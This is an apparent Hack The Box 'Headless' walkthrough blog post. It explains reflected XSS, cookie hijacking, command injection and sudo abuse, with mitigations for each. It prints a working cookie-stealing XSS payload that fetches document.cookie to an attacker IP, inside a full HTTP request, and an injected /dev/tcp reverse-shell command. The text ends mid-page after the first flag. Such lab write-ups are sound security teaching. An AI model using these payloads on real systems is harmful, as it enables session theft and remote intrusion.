<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Headless - XSS, Command Injection, and Sudo abuse. | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Headless - Hack The Box walkthrough."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%A8%E2%80%8D%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2024/headleass-walkthrough/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="nav-item "> <a class="nav-link" href="/library/">Library</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/essential-eight/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/artificial-intelligence/">Artificial Intelligence</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Headless - XSS, Command Injection, and Sudo abuse.</h1> <p class="post-meta">April 15, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/easy-box"> <i class="fas fa-hashtag fa-sm"></i> easy-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/xss"> <i class="fas fa-hashtag fa-sm"></i> XSS</a>   <a href="/blog/tag/reflected-xss"> <i class="fas fa-hashtag fa-sm"></i> Reflected-XSS</a>   <a href="/blog/tag/cross-site-scripting"> <i class="fas fa-hashtag fa-sm"></i> Cross-Site-Scripting</a>   <a href="/blog/tag/cookies"> <i class="fas fa-hashtag fa-sm"></i> cookies</a>   <a href="/blog/tag/cookie-manipulation"> <i class="fas fa-hashtag fa-sm"></i> cookie-manipulation</a>   <a href="/blog/tag/session-hijacking"> <i class="fas fa-hashtag fa-sm"></i> session-hijacking</a>   <a href="/blog/tag/command-injection"> <i class="fas fa-hashtag fa-sm"></i> command-injection</a>   <a href="/blog/tag/sudo-misconfiguration"> <i class="fas fa-hashtag fa-sm"></i> sudo-misconfiguration</a>   <a href="/blog/tag/relative-paths"> <i class="fas fa-hashtag fa-sm"></i> relative-paths</a>   <a href="/blog/tag/secure-coding"> <i class="fas fa-hashtag fa-sm"></i> secure-coding</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <p>Headless is rated as an easy box. It begins with exploiting a Reflected Cross-Site Scripting (XSS) vulnerability to steal a cookie. Requests to a restricted page are manipulated to include the stolen cookie to hijack an admin session, and access the page. From there, an un-sanitised field on a form is abused to obtain remote code execution via a reverse shell. Privilege escalation is achieved by abusing a <code class="language-plaintext highlighter-rouge">sudo</code> misconfiguration.</p> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3> <p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS allows attackers to inject malicious scripts into content that other users will view. When this content is viewed, the malicious script executes, which can lead to data theft, session hijacking, and other types of security breaches.</p> <p>There are three main types of XSS:</p> <ol> <li> <strong>Reflected XSS</strong>: The malicious script comes from the user’s current request.</li> <li> <strong>Stored XSS</strong>: The malicious script is stored on the server (e.g., in a database) and then later sent to users.</li> <li> <strong>DOM-based XSS</strong>: The vulnerability is in the client-side code rather than the server-side code.</li> </ol> <p>This machine demonstrated an reflected XSS.</p> <h4 id="example-of-reflected-xss">Example of Reflected XSS</h4> <p>Imagine a scenario where a website has a search function that reflects user input in its response without proper input sanitisation or encoding. For instance:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Example of a vulnerable HTML page --&gt;</span> 
<span class="nt">&lt;html&gt;</span> 
<span class="nt">&lt;body&gt;</span> 
	<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"search"</span><span class="nt">&gt;</span> 
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"query"</span><span class="nt">&gt;</span> 
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">&gt;</span> 
	<span class="nt">&lt;/form&gt;</span> 
	<span class="nt">&lt;p&gt;</span>You searched for: <span class="cp">&lt;?php echo $_GET['query']; ?&gt;</span><span class="nt">&lt;/p&gt;</span> 
<span class="nt">&lt;/body&gt;</span> 
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p>If a user inputs a search term like <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, and the server includes this input in the HTML response without sanitising, the script will execute in the user’s browser. This script could be something more malicious, like stealing cookies or other sensitive information.</p> <h4 id="mitigation">Mitigation</h4> <ul> <li> <strong>Input Sanitisation</strong>: Always sanitize all inputs, especially those that can be reflected back in any form to the user. This includes less obvious fields like HTTP headers (<em>hint: that’s the vector for this machine)</em>.</li> <li> <strong>Content Security Policy (CSP)</strong>: Implementing a robust CSP can help prevent XSS by restricting the sources from which scripts can be loaded and executed.</li> <li> <strong>Secure Coding Practices</strong>: Employ secure coding practices that involve encoding user inputs so that they are treated as data rather than executable code.</li> </ul> <h3 id="cookie-manipulation">Cookie manipulation</h3> <p>Cookie manipulation involves altering the contents of a cookie before it is sent to the server. This could involve changing session tokens, user IDs, or other data stored in cookies to escalate privileges or change user settings.</p> <h4 id="mitigation-1">Mitigation</h4> <ul> <li> <strong>Use Secure Cookies</strong>: Set cookies with the <code class="language-plaintext highlighter-rouge">Secure</code> attribute to ensure they are only sent over HTTPS, preventing transmission over unencrypted connections.</li> <li> <strong>HttpOnly Attribute</strong>: Use the <code class="language-plaintext highlighter-rouge">HttpOnly</code> attribute to prevent access to cookie values via JavaScript. This helps protect against XSS attacks that attempt to steal cookies.</li> <li> <strong>SameSite Attribute</strong>: Use the <code class="language-plaintext highlighter-rouge">SameSite</code> attribute to restrict how cookies are sent with cross-site requests. This can help prevent cross-site request forgery (CSRF) attacks.</li> <li> <strong>Cookie Integrity</strong>: Implement mechanisms to ensure the integrity of cookie values, such as signing cookies with a secret key. An integrity check can detect if the cookie has been tampered with.</li> <li> <strong>Strict Validation</strong>: Validate all input from cookies before use. Do not trust data stored in cookies without validation, especially for access control decisions.</li> </ul> <h3 id="session-hijacking">Session hijacking</h3> <p>Session hijacking, also known as session takeover, involves exploiting a valid computer session—most often by stealing or predicting a valid session token—to gain unauthorized access to information or services in a computer system.</p> <h4 id="mitigation-2">Mitigation</h4> <ul> <li> <strong>Session Expiration</strong>: Implement session expiration and timeout mechanisms that automatically log users out after a period of inactivity or after a maximum session duration.</li> <li> <strong>Regenerate Session IDs</strong>: Regenerate session IDs after a successful login to prevent session fixation attacks, where an attacker fixes the session ID before the user logs in.</li> <li> <strong>Monitor and Validate Sessions</strong>: Monitor session activity for anomalies and validate sessions based on multiple attributes (e.g., IP address, User-Agent) to detect and prevent hijacking.</li> </ul> <h3 id="command-injection">Command injection</h3> <p>Command injection vulnerabilities can occur in any place where an application passes user input to a system shell command. If the user input is not properly sanitized, attackers can append additional commands or alter the intended command, leading to potentially severe consequences such as unauthorized access, data leakage, or server compromise.</p> <h4 id="mitigation-3">Mitigation</h4> <ul> <li> <strong>Proper Input Validation</strong>: Ensure that all user inputs are validated against a strict set of rules. Only allow known good inputs to pass through and be used in commands.</li> <li> <strong>Avoid Using Shell Commands</strong>: Where possible, avoid using shell commands altogether. Use built-in library functions provided by your programming language or framework that perform the desired operations without invoking the shell.</li> <li> <strong>Use Safe APIs</strong>: If you must execute system commands, use safe APIs that avoid shell execution, such as parameterized functions or APIs that do not involve the shell.</li> <li> <strong>Escaping Special Characters</strong>: If system commands must include user input, ensure that special characters are properly escaped so that they are treated as literal values rather than executable code. However, escaping should be a last resort after safer alternatives have been considered.</li> <li> <strong>Use Least Privilege Principles</strong>: Run applications with the minimum permissions necessary. Restricting the privileges of the application environment can limit the damage an attacker can do if they manage to inject commands.</li> </ul> <h3 id="sudo-misconfiguration">Sudo misconfiguration</h3> <p>The <code class="language-plaintext highlighter-rouge">sudoers</code> file controls which users can execute commands with elevated privileges. If this file is configured to allow a user to run certain commands as the superuser without requiring a password, it may lead to security risks if the commands are inherently dangerous or can be exploited.</p> <p>Some binaries, when executed with elevated privileges, can be used to perform tasks that compromise the security of the system. For instance, if a binary allows file manipulation, code execution, or access to the shell, an attacker can use it to gain higher privileges or execute arbitrary commands.</p> <h4 id="mitigation-strategies">Mitigation Strategies</h4> <ul> <li> <strong>Review and Restrict Sudo Policies</strong>: Regularly audit the <code class="language-plaintext highlighter-rouge">sudoers</code> file to ensure that only necessary permissions are granted. Commands that can be exploited for privilege escalation should not be runnable with elevated privileges without strong justifications and controls.</li> <li> <strong>Password Protections</strong>: Require passwords for sudo access to add an extra layer of security, ensuring that only authenticated users can execute commands with elevated privileges.</li> <li> <strong>Security Training and Awareness</strong>: Educate administrators and users about the risks associated with improper sudo configurations and encourage security best practices.</li> <li> <strong>Use Secure Programming Practices</strong>: When developing applications that will be used in environments with sudo access, ensure they are securely coded to prevent exploitation.</li> <li> <strong>Regular Security Audits</strong>: Regularly perform security audits and vulnerability assessments to identify and mitigate risks associated with privilege escalation.</li> </ul> <h3 id="insecure-coding-practices">Insecure coding practices</h3> <p>Insecure coding practices can lead to significant vulnerabilities, allowing attackers to exploit the application. Here are common insecure coding practices observed:</p> <ul> <li> <strong>Improper Input Sanitisation</strong>: Failing to sanitise user inputs properly can lead to various forms of injection attacks, including SQL, command, and script injections. In the context of the “Headless” box, the lack of sanitisation in the date selection field allowed for command injection, demonstrating how critical rigorous input validation is to security.</li> <li> <strong>Using Relative Paths for File Execution</strong>: Utilising relative paths for file execution, as seen with the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script in the <code class="language-plaintext highlighter-rouge">syscheck</code> binary, poses a security risk. It can lead to unauthorised file execution if an attacker can place a malicious file in the expected path, leading to privilege escalation.</li> </ul> <h4 id="mitigation-4">Mitigation</h4> <ul> <li> <strong>Implement Thorough Input Validation</strong>: Ensure all user inputs are validated against a strict set of rules. Reject any input that does not strictly conform to expected patterns, especially in command execution or database queries.</li> <li> <strong>Use Absolute Paths</strong>: Always use absolute paths when referencing executables or other files within code. This practice prevents directory traversal attacks and ensures that the application only accesses files explicitly defined in the code.</li> <li> <strong>Adopt Secure Coding Standards</strong>: Follow secure coding guidelines and standards such as OWASP Top 10 to understand and mitigate common vulnerabilities. Regular code reviews and security audits can also help catch and fix insecure practices early in the development lifecycle.</li> </ul> <h2 id="tools">Tools</h2> <ul> <li>Nmap</li> <li>Burpsuite</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h4 id="exploiting-a-reflected-xss-vulnerability-to-steal-cookies">Exploiting a Reflected XSS vulnerability to steal cookies</h4> <ul> <li>The webform fields were sanitised, but the HTTP headers were not. Exploiting the lack of sanitisation on the <code class="language-plaintext highlighter-rouge">User-Agent</code> (or <code class="language-plaintext highlighter-rouge">Accept</code>) field in the headers allows for a cookie to be stolen.</li> </ul> <h4 id="authentication-bypass-via-cookie-manipulation-and-session-hijacking">Authentication bypass via cookie manipulation and session hijacking</h4> <ul> <li>By manipulating the HTTP headers to include a stolen cookie, a admin session was hijacked and unauthorised access to a dashboard obtained.</li> </ul> <h4 id="remote-code-execution-via-command-injection">Remote code execution via command injection</h4> <ul> <li>By exploiting an field on the dashboard that was not sanitised, a reverse shell was created and executed server-side.</li> </ul> <h4 id="abusing-sudo-to-achieve-privilege-escalation">Abusing <code class="language-plaintext highlighter-rouge">Sudo</code> to achieve privilege escalation</h4> <ul> <li>A relative path within a binary the standard user could run as <code class="language-plaintext highlighter-rouge">sudo</code> with no password was exploited to call a malicious script to execute a reverse shell as root.</li> </ul> <hr> <h1 id="enumeration">Enumeration</h1> <p>As always, begin with Nmap scanning</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/headless/scans]
└─<span class="nv">$ </span>nmap <span class="nt">-A</span> 10.129.27.108 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-12 23:51 EDT
Nmap scan report <span class="k">for </span>10.129.27.108
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 2799
|     Set-Cookie: <span class="nv">is_admin</span><span class="o">=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;title&gt;Under Construction&lt;/title&gt;
|     &lt;style&gt;
|     body <span class="o">{</span>
|     font-family: <span class="s1">'Arial'</span>, sans-serif<span class="p">;</span>
|     background-color: <span class="c">#f7f7f7;</span>
|     margin: 0<span class="p">;</span>
|     padding: 0<span class="p">;</span>
|     display: flex<span class="p">;</span>
|     justify-content: center<span class="p">;</span>
|     align-items: center<span class="p">;</span>
|     height: 100vh<span class="p">;</span>
|     .container <span class="o">{</span>
|     text-align: center<span class="p">;</span>
|     background-color: <span class="c">#fff;</span>
|     border-radius: 10px<span class="p">;</span>
|     box-shadow: 0px 0px 20px rgba<span class="o">(</span>0, 0, 0, 0.2<span class="o">)</span><span class="p">;</span>
|   RTSPRequest:
|     &lt;<span class="o">!</span>DOCTYPE HTML&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request version <span class="o">(</span><span class="s1">'RTSP/1.0'</span><span class="o">)</span>.&lt;/p&gt;
|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Port 22</li> <li>Port 5000 with some additional details</li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 2799
|     Set-Cookie: <span class="nv">is_admin</span><span class="o">=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;title&gt;Under Construction&lt;/title&gt;
</code></pre></div></div> <p>The server header indicates the use of Werkzeug/2.2.2 Python/3.11.2, suggesting a Python-based web application, possibly Flask. The presence of a cookie with the name <code class="language-plaintext highlighter-rouge">is_admin</code> is particularly interesting. It suggests that the application might be vulnerable to cookie tampering or session management vulnerabilities.</p> <p>Possible vectors include:</p> <ul> <li> <strong>Cookie Manipulation:</strong> You can explore manipulating this cookie. Try decoding it if it’s base64-encoded, or if it looks like a serialized Python object, consider object deserialization attacks.</li> <li> <strong>Directory Traversal/File Inclusion:</strong> Given it’s a web server, you might also look into directory traversal or file inclusion vulnerabilities.</li> </ul> <h2 id="server-enumeration">Server enumeration</h2> <p>Dirsearch is used to find other pages to enumerate on.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/headless/scans]
└─<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://10.129.27.108:5000
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/headless/scans/reports/http_10.129.27.108_5000/_24-04-13_00-10-00.txt

Target: http://10.129.27.108:5000/

<span class="o">[</span>00:10:00] Starting:
<span class="o">[</span>00:12:25] 401 -  317B  - /dashboard
<span class="o">[</span>00:14:28] 200 -    2KB - /support

Task Completed
</code></pre></div></div> <p>Two pages are identified:</p> <ol> <li> <code class="language-plaintext highlighter-rouge">http://10.129.27.108:5000/dashboard</code> results in Unauthorized.</li> <li> <code class="language-plaintext highlighter-rouge">http://10.129.27.108:5000/support</code> returns a webform.</li> </ol> <p><img src="/assets/img/2024/2024-03-headless/webform.png" alt="webform.png" class="auto-resize"></p> <h2 id="webform-enumeration">Webform enumeration</h2> <p>Using Burpsuite, the responses to the submissions can be monitored.</p> <p>A benign submissions results in a unremarkable POST request with a 200 status code.</p> <p>Sending an url-encoded reverse shell returns a <strong>Hacking Attempt Detected</strong>* warning, with the previously identified cookie displayed.</p> <p><img src="/assets/img/2024/2024-03-headless/url-encoded-shell.png" alt="url-encoded-shell.png" class="auto-resize"></p> <p><img src="/assets/img/2024/2024-03-headless/hacking-attempt-detected.png" alt="hacking-attempt-detected.png" class="auto-resize"></p> <p>The cookie’s first part decodes from Base-64 to <code class="language-plaintext highlighter-rouge">user</code>. The second part is not clearly discernible. If it were a JWT the second part would be the payload, so perhaps this represents unique users.</p> <p>The inclusion of the cookie in various locations suggests that perhaps other cookies can be stolen.</p> <h1 id="stealing-cookies-via-a-reflected-xss">Stealing cookies via a Reflected XSS</h1> <h2 id="user-agent-as-an-injection-point">User-Agent as an injection point</h2> <p>The server is displaying an error page when a hacking attempt is detected, and this page includes the <code class="language-plaintext highlighter-rouge">User-Agent</code> string, along with other client request information. If this information is not sanitised before being included in the HTML of the error page, it could lead to an XSS vulnerability.</p> <h2 id="the-payload">The payload</h2> <p>The following payload uses an error-handling method to execute JavaScript.</p> <p><code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=fetch('http://IP/?c='+document.cookie);&gt;</code></p> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code></strong>: This part attempts to load an image from a source that doesn’t exist (<code class="language-plaintext highlighter-rouge">x</code>), which will naturally cause an error.</li> <li> <strong><code class="language-plaintext highlighter-rouge">onerror=fetch(...)</code></strong>: The <code class="language-plaintext highlighter-rouge">onerror</code> attribute of the <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag fires when an error occurs (like failing to load the image). It triggers the fetch API call.</li> <li> <strong><code class="language-plaintext highlighter-rouge">fetch('http://IP/?c='+document.cookie)</code></strong>: This JavaScript fetches a URL, appending the document’s cookies as a query parameter.</li> </ul> <p>The <code class="language-plaintext highlighter-rouge">fetch</code> part is a classic technique for stealing cookies if the fetched domain is controlled by the attacker which, in this case, it is.</p> <h2 id="executing-the-attack">Executing the attack</h2> <p>To execute the attack, Burpsuite can be used to repeat the POST method used to submit a form.</p> <p>The payload is then placed in the <code class="language-plaintext highlighter-rouge">User-Agent</code> field. However, any of the fields that are rendered in the HTML of the error page could potentially work. For example, replacing the <code class="language-plaintext highlighter-rouge">Accept</code> value with the payload also worked in this instance.</p> <p>The <code class="language-plaintext highlighter-rouge">message</code> field of the form needs to include something that will trigger the error. This could be the reverse shell attempted earlier or a copy of the payload in the <code class="language-plaintext highlighter-rouge">User-Agent</code> field - it doesn’t matter, as long as it triggers the error.</p> <blockquote> <p><em>Including the cookie stealing payload in the <code class="language-plaintext highlighter-rouge">message</code> field is only to trigger the error; it does not actually execute from here because this field is not displayed back on the error page.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /support HTTP/1.1
Host: 10.129.27.108:5000
Content-Length: 140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.27.108:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: &lt;img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);&gt;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.27.108:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=emdeh&amp;lname=emdeh&amp;email=emdeh%40emdeh.com&amp;phone=emdeh&amp;message=abc; &lt;img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);&gt;
</code></pre></div></div> <p>Once the payload is ready, a webserver is started to receive the <code class="language-plaintext highlighter-rouge">document.cookie</code> value as a query parameter to the malicious GET request the server is inadvertently tricked into sending.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.129.27.108 - - <span class="o">[</span>13/Apr/2024 01:12:14] <span class="s2">"GET /?c=is_admin=ImFkbWluIg.&lt;SNIP&gt; HTTP/1.1"</span> 200 -

</code></pre></div></div> <h1 id="cookie-manipulation-1">Cookie manipulation</h1> <p>Putting the captured cookie through a decoder reveals it has a header value of <code class="language-plaintext highlighter-rouge">admin</code>. Given the original cookie had a value of <code class="language-plaintext highlighter-rouge">user</code>, it would appear an administrator cookie has been obtained.</p> <p>Including the cookie in a request to the <code class="language-plaintext highlighter-rouge">/dashboard</code> page successfully hijacks a admin session and reveals the Administrator Dashboard with a simple form to generate a website health report with a <code class="language-plaintext highlighter-rouge">Select Date</code> field.</p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard.png" alt="admin-dashboard.png" class="auto-resize"></p> <h1 id="enumerating-the-select-date-field">Enumerating the <code class="language-plaintext highlighter-rouge">Select Date</code> field</h1> <p>Testing to see if the <code class="language-plaintext highlighter-rouge">Select Date</code> field is properly sanitised quickly suggests it is not. Including <code class="language-plaintext highlighter-rouge">;ls</code> returns a list of files to the browser as shown below.</p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls.png" alt="admin-dashboard-ls.png" class="auto-resize"></p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls-show.png" alt="admin-dashboard-ls-show.png" class="auto-resize"></p> <h1 id="command-injection-1">Command injection</h1> <p>Attempting to exploit this to execute a reverse shell fails. Another option is to attempt to create a reverse shell in a file, and then subsequently call the file.</p> <p>Try to create a reverse shell on the server, the following command is injected into the field:</p> <p><code class="language-plaintext highlighter-rouge">echo '#!/bin/bash' &gt; reverse_shell.sh &amp;&amp; echo 'sh -i &gt;&amp; /dev/tcp/10.10.14.6/4321 0&gt;&amp;1' &gt;&gt; reverse_shell.sh</code></p> <p>The command is URL-encoded and submitted, making sure to include the stolen cookie in the HTTP headers.</p> <p><img src="/assets/img/2024/2024-03-headless/data-payload.png" alt="data-payload.png" class="auto-resize"></p> <p>To validate that the file has been created successfully, another <code class="language-plaintext highlighter-rouge">ls</code> command can be sent.</p> <p><img src="/assets/img/2024/2024-03-headless/rev-shell-confirm.png" alt="rev-shell-confirm.png" class="auto-resize"></p> <p>After confirming the file was successfully created, it can be called and the resulting shell caught on a netcat listener as shown below.</p> <p><img src="/assets/img/2024/2024-03-headless/rev-shell-execute.png" alt="rev-shell-execute.png" class="auto-resize"></p> <p>And the first flag found.</p> <p><img 